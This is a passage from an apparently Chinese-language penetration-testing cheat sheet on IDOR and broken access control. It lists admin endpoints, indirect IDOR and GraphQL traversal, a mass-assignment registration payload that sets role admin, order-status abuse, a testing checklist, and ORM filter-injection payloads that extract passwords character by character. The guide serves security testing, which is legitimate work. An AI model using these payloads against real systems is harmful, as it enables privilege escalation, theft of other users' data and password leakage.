DELETE /api/v1/users/{any_user_id}
PUT    /api/v1/users/{user_id}/role
POST   /api/v1/users/bulk-delete
GET    /api/v1/export/all-data
POST   /api/v1/admin/subscription/modify
GET    /api/v1/reports/all-users-activity
```

隐藏管理端点发现：

1. 读 JS bundle —— 管理路由常在前端代码里
2. Swagger/OpenAPI 里找 "admin" / "internal" / "privileged" 标签
3. 枚举 `/api/v1/admin/**`、`/manage/**`、`/internal/**`
4. Burp Discover Content 打 API 基路径
5. 对比普通用户文档与管理员文档的差异

## 间接 IDOR（引用链）

应用校验了对象 A 的归属，却没校验 A 引用的对象 B：

```text
GET /api/messages/1234    → 校验"是您的消息吗？" ✓
GET /api/attachments/5678 → 不校验附件属于谁 ✗
```

直接用 ID 访问子资源（附件/评论/交易），绕过父端点。GraphQL 变体：沿关系内联查他人私有字段：

```graphql
query { myProfile { followers { privateEmail } } }
```

## Mass Assignment → 提权

POST/PUT 的 JSON body 里，底层模型字段即使不在官方文档也可能可写：

```json
POST /api/v1/register
{
  "username": "attacker",
  "email": "a@evil.com",
  "password": "password",
  "role": "admin",        ← 隐藏字段
  "isAdmin": true,
  "verified": true,       ← 跳过邮箱验证
  "creditBalance": 9999
}
```

发现隐藏字段：对比管理员"创建用户"与普通"注册"的请求字段差异；读 API 文档全字段；JS bundle/源码；Burp 模糊常见属性名看 200 vs 400。

## 状态机滥用（业务逻辑 IDOR）

```text
PUT /api/orders/1234 {"status": "delivered"}   ← pending 直接跳 delivered
PUT /api/orders/1234 {"status": "refunded"}    ← 跳过 shipped
PUT /api/orders/UserA_order_id {"status": "cancelled"}  ← 以 UserB 改他人订单
```

## IDOR 快速清单

```text
□ 注册两个账号
□ 导出 Burp History，圈出所有含对象 ID 的请求
□ 每个端点试全部 HTTP 动词
□ ID 位置全测：path / body / header / query / cookie
□ 顺序 ID 试 -1 / +1
□ 收集自有数据的 UUID 再交叉试
□ 测子资源（附件/评论/交易）
□ 直接测管理端点（BFLA）
□ POST/PUT body 加隐藏字段（mass assignment）
□ 对比响应字段数与文档字段数（找隐藏字段）
□ 测状态/status 字段改写
```

## 系统化测试 — 8 类 IDOR

| # | 类别 | 测法 |
|---|---|---|
| 1 | 直接 ID 引用 | `/api/users/123` → `/api/users/124` |
| 2 | 可预测 UUID | v1 时间基可推算相邻 ID |
| 3 | 批量操作 | `/api/users/bulk?ids=123,456` 混入他人 ID |
| 4 | 导出/下载 | `/export?user_id=*` 泄露他人数据 |
| 5 | 关联对象 IDOR | 改 `order.address_id` 指向他人地址 |
| 6 | 资源替换 | 自己资料里填他人资源 ID → 覆盖 |
| 7 | 写 IDOR | PUT/PATCH/DELETE 带他人 ID |
| 8 | 嵌套对象 | `/api/orgs/1/users/2` 改 org ID 跨租户 |

组合升级示例：低权限 IDOR 读到管理员 token（`GET /api/v1/users/1/details`）→ 直接水平越权变垂直提权。

## ORM 过滤链泄露

**Django ORM 过滤注入**：

```python
# 漏洞点: User.objects.filter(**request.data)
# 攻击: {"password__startswith": "a"} → WHERE password LIKE 'a%'
# 逐字符提取：200 = 匹配，404 = 不匹配
# 关系穿越: {"author__user__password__startswith": "a"}
# MySQL 上还能 {"email__regex": "^(a+)+$"} 打 ReDoS
```

**Prisma 过滤注入**：

```json
// 漏洞点: prisma.user.findMany({ where: req.body })
{ "include": { "posts": { "include": { "author": { "select": { "password": true } } } } } }
// 沿关系穿越泄露 password 字段
```

**Ransack（Rails）**：

```text
GET /users?q[password_cont]=admin     → WHERE password LIKE '%admin%'
GET /users?q[password_start]=a        → 数结果逐字符收窄
# 自动化工具: plormber
```
